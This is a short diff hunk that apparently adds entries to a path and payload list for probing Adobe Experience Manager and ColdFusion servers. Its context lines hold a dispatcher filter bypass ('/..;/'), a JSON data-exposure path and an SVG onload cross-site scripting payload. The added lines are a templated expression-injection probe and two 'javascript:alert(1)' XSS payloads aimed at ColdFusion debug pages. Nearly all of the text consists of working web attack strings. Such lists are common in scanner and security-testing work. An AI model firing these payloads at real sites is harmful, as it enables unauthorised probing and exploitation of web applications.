@@ -17,3 +17,7 @@
 //content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
 /..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
 /etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+/mnt/overlay/dam/gui/content/assets/metadataeditor.external.html?item=$%7b{{num1}}*{{num2}}%7d
+{{paths}}
+/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
+/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
